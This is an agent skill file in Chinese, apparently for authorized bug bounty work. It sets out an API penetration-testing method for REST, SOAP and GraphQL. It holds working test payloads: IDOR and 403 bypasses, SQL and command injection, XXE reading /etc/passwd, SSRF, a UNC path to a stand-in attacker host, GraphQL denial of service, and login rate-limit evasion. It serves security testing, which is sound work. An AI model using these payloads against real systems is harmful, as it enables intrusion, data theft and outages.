---
name: api-fuzzing-bug-bounty
description: "为漏洞赏金狩猎和渗透测试提供 REST、SOAP 和 GraphQL API 的全面测试技术。涵盖漏洞发现、认证绕过、IDOR 利用和 API 特定攻击向量。触发词：API模糊测试、漏洞赏金、API安全测试、IDOR测试、GraphQL安全、认证绕过、API渗透测试、REST API测试、SOAP API测试、API漏洞发现"
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> 仅限授权使用：本技能仅用于授权的安全评估、防御性验证或受控教育环境。

# API 模糊测试用于漏洞赏金

## 目的

为漏洞赏金狩猎和渗透测试提供 REST、SOAP 和 GraphQL API 的全面测试技术。涵盖漏洞发现、认证绕过、IDOR 利用和 API 特定攻击向量。

## 输入/前置条件

- Burp Suite 或类似代理工具
- API 字典列表（SecLists、api_wordlist）
- 理解 REST/GraphQL/SOAP 协议
- Python 脚本编写能力
- 目标 API 端点和文档（如有）

## 输出/交付物

- 已识别的 API 漏洞
- IDOR 利用证明
- 认证绕过技术
- SQL 注入点
- 未授权数据访问文档

---

## API 类型概览

| 类型 | 协议 | 数据格式 | 结构 |
|------|------|----------|------|
| SOAP | HTTP | XML | Header + Body |
| REST | HTTP | JSON/XML/URL | 定义端点 |
| GraphQL | HTTP | 自定义查询 | 单一端点 |

---

## 核心工作流程

### 步骤 1：API 侦察

识别 API 类型并枚举端点：

```bash
# 检查 Swagger/OpenAPI 文档
/swagger.json
/openapi.json
/api-docs
/v1/api-docs
/swagger-ui.html

# 使用 Kiterunner 进行 API 发现
kr scan https://target.com -w routes-large.kite

# 从 Swagger 提取路径
python3 json2paths.py swagger.json
```

### 步骤 2：认证测试

```bash
# 测试不同的登录路径
/api/mobile/login
/api/v3/login
/api/magic_link
/api/admin/login

# 检查认证端点的速率限制
# 如果没有速率限制 → 可能存在暴力破解

# 分别测试移动端和 Web 端 API
# 不要假设相同的安全控制
```

### 步骤 3：IDOR 测试

不安全的直接对象引用是最常见的 API 漏洞：

```bash
# 基本 IDOR
GET /api/users/1234 → GET /api/users/1235

# 即使 ID 是邮箱格式，也尝试数字
/?user_id=111 instead of /?user_id=user@mail.com

# 测试 /me/orders vs /user/654321/orders
```

**IDOR 绕过技术：**

```bash
# 将 ID 包装在数组中
{"id":111} → {"id":[111]}

# JSON 包装
{"id":111} → {"id":{"id":111}}

# 发送两次 ID
URL?id=<LEGIT>&id=<VICTIM>

# 通配符注入
{"user_id":"*"}

# 参数污染
/api/get_profile?user_id=<victim>&user_id=<legit>
{"user_id":<legit_id>,"user_id":<victim_id>}
```

### 步骤 4：注入测试

**JSON 中的 SQL 注入：**

```json
{"id":"56456"}                    → OK
{"id":"56456 AND 1=1#"}           → OK  
{"id":"56456 AND 1=2#"}           → OK
{"id":"56456 AND 1=3#"}           → ERROR (存在漏洞!)
{"id":"56456 AND sleep(15)#"}     → 延迟 15 秒
```

**命令注入：**

```bash
# Ruby on Rails
?url=Kernel#open → ?url=|ls

# Linux 命令注入
api.url.com/endpoint?name=file.txt;ls%20/
```

**XXE 注入：**

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

**通过 API 进行 SSRF：**

```html
<object data="http://127.0.0.1:8443"/>
<img src="http://127.0.0.1:445"/>
```

**.NET Path.Combine 漏洞：**

```bash
# 如果 .NET 应用使用 Path.Combine(path_1, path_2)
# 测试路径遍历
https://example.org/download?filename=a.png
https://example.org/download?filename=C:\inetpub\wwwroot\web.config
https://example.org/download?filename=\\smb.dns.attacker.com\a.png
```

### 步骤 5：方法测试

```bash
# 测试所有 HTTP 方法
GET /api/v1/users/1
POST /api/v1/users/1
PUT /api/v1/users/1
DELETE /api/v1/users/1
PATCH /api/v1/users/1

# 切换内容类型
Content-Type: application/json → application/xml
```

---

## GraphQL 专项测试

### 内省查询

获取整个后端架构：

```graphql
{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,args{name,type{name,kind}}}}}}
```

**URL 编码版本：**

```
/graphql?query={__schema{types{name,kind,description,fields{name}}}}
```

### GraphQL IDOR

```graphql
# 尝试访问其他用户 ID
query {
  user(id: "OTHER_USER_ID") {
    email
    password
    creditCard
  }
}
```

### GraphQL SQL/NoSQL 注入

```graphql
mutation {
  login(input: {
    email: "test' or 1=1--"
    password: "password"
  }) {
    success
    jwt
  }
}
```

### 速率限制绕过（批处理）

```graphql
mutation {login(input:{email:"a@example.com" password:"password"}){success jwt}}
mutation {login(input:{email:"b@example.com" password:"password"}){success jwt}}
mutation {login(input:{email:"c@example.com" password:"password"}){success jwt}}
```

### GraphQL DoS（嵌套查询）

```graphql
query {
  posts {
    comments {
      user {
        posts {
          comments {
            user {
              posts { ... }
            }
          }
        }
      }
    }
  }
}
```

### GraphQL XSS

```bash
# 通过 GraphQL 端点的 XSS
http://target.com/graphql?query={user(name:"<script>alert(1)</script>"){id}}

# URL 编码的 XSS
http://target.com/example?id=%C/script%E%Cscript%Ealert('XSS')%C/script%E
```

### GraphQL 工具

| 工具 | 用途 |
|------|------|
| GraphCrawler | 架构发现 |
| graphw00f | 指纹识别 |
| clairvoyance | 架构重建 |
| InQL | Burp 扩展 |
| GraphQLmap | 漏洞利用 |

---

## 端点绕过技术

当收到 403/401 时，尝试以下绕过方法：

```bash
# 原始被阻止的请求
/api/v1/users/sensitivedata → 403

# 绕过尝试
/api/v1/users/sensitivedata.json
/api/v1/users/sensitivedata?
/api/v1/users/sensitivedata/
/api/v1/users/sensitivedata??
/api/v1/users/sensitivedata%20
/api/v1/users/sensitivedata%09
/api/v1/users/sensitivedata#
/api/v1/users/sensitivedata&details
/api/v1/users/..;/sensitivedata
```

---

## 输出利用

### PDF 导出攻击

```html
<!-- 通过 PDF 导出的 LFI -->
<iframe src="file:///etc/passwd" height=1000 width=800>

<!-- 通过 PDF 导出的 SSRF -->
<object data="http://127.0.0.1:8443"/>

<!-- 端口扫描 -->
<img src="http://127.0.0.1:445"/>

<!-- IP 泄露 -->
<img src="https://iplogger.com/yourcode.gif"/>
```

### 通过限制进行 DoS

```bash
# 正常请求
/api/news?limit=100

# DoS 尝试
/api/news?limit=9999999999
```

---

## 常见 API 漏洞清单

| 漏洞 | 描述 |
|------|------|
| API 暴露 | 未受保护的端点公开暴露 |
| 缓存配置错误 | 敏感数据被错误缓存 |
| 令牌泄露 | API 密钥/令牌出现在响应或 URL 中 |
| JWT 弱点 | 弱签名、无过期时间、算法混淆 |
| IDOR / BOLA | 破损的对象级授权 |
| 未记录的端点 | 隐藏的管理/调试端点 |
| 不同版本 | 旧版 API 中的安全缺口 |
| 速率限制 | 缺失或可绕过的速率限制 |
| 竞态条件 | TOCTOU 漏洞 |
| XXE 注入 | XML 解析器利用 |
| 内容类型问题 | 在 JSON/XML 之间切换 |
| HTTP 方法篡改 | GET→DELETE/PUT 滥用 |

---

## 快速参考

| 漏洞 | 测试载荷 | 风险等级 |
|------|----------|----------|
| IDOR | 更改 user_id 参数 | 高 |
| SQLi | JSON 中使用 `' OR 1=1--` | 严重 |
| 命令注入 | `; ls /` | 严重 |
| XXE | 带有 ENTITY 的 DOCTYPE | 高 |
| SSRF | 参数中使用内部 IP | 高 |
| 速率限制绕过 | 批量请求 | 中 |
| 方法篡改 | GET→DELETE | 高 |

---

## 工具参考

| 类别 | 工具 | URL |
|------|------|-----|
| API 模糊测试 | Fuzzapi | github.com/Fuzzapi/fuzzapi |
| API 模糊测试 | API-fuzzer | github.com/Fuzzapi/API-fuzzer |
| API 模糊测试 | Astra | github.com/flipkart-incubator/Astra |
| API 安全 | apicheck | github.com/BBVA/apicheck |
| API 发现 | Kiterunner | github.com/assetnote/kiterunner |
| API 发现 | openapi_security_scanner | github.com/ngalongc/openapi_security_scanner |
| API 工具包 | APIKit | github.com/API-Security/APIKit |
| API 密钥 | API Guesser | api-guesser.netlify.app |
| GUID | GUID Guesser | gist.github.com/DanaEpp/8c6803e542f094da5c4079622f9b4d18 |
| GraphQL | InQL | github.com/doyensec/inql |
| GraphQL | GraphCrawler | github.com/gsmith257-cyber/GraphCrawler |
| GraphQL | graphw00f | github.com/dolevf/graphw00f |
| GraphQL | clairvoyance | github.com/nikitastupin/clairvoyance |
| GraphQL | batchql | github.com/assetnote/batchql |
| GraphQL | graphql-cop | github.com/dolevf/graphql-cop |
| 字典列表 | SecLists | github.com/danielmiessler/SecLists |
| Swagger 解析器 | Swagger-EZ | rhinosecuritylabs.github.io/Swagger-EZ |
| Swagger 路由 | swagroutes | github.com/amalmurali47/swagroutes |
| API 思维导图 | MindAPI | dsopas.github.io/MindAPI/play |
| JSON 路径 | json2paths | github.com/s0md3v/dump/tree/master/json2paths |

---

## 约束条件

**必须：**
- 分别测试移动端、Web 端和开发者 API
- 检查所有 API 版本（/v1、/v2、/v3）
- 验证已认证和未认证的访问

**禁止：**
- 假设不同 API 版本具有相同的安全控制
- 跳过未记录端点的测试
- 忽略速率限制检查

**建议：**
- 添加 `X-Requested-With: XMLHttpRequest` 请求头以模拟前端
- 检查 archive.org 获取历史 API 端点
- 测试敏感操作的竞态条件

---

## 示例

### 示例 1：IDOR 利用

```bash
# 原始请求（自己的数据）
GET /api/v1/invoices/12345
Authorization: Bearer <token>

# 修改后的请求（其他用户的数据）
GET /api/v1/invoices/12346
Authorization: Bearer <token>

# 响应泄露了其他用户的发票数据
```

### 示例 2：GraphQL 内省

```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}'
```

---

## 故障排除

| 问题 | 解决方案 |
|------|----------|
| API 返回空内容 | 添加 `X-Requested-With: XMLHttpRequest` 请求头 |
| 所有端点返回 401 | 尝试添加 `?user_id=1` 参数 |
| GraphQL 内省被禁用 | 使用 clairvoyance 进行架构重建 |
| 被速率限制 | 使用 IP 轮换或批量请求 |
| 找不到端点 | 检查 Swagger、archive.org、JS 文件 |

## 何时使用
本技能适用于执行概述中描述的工作流程或操作。
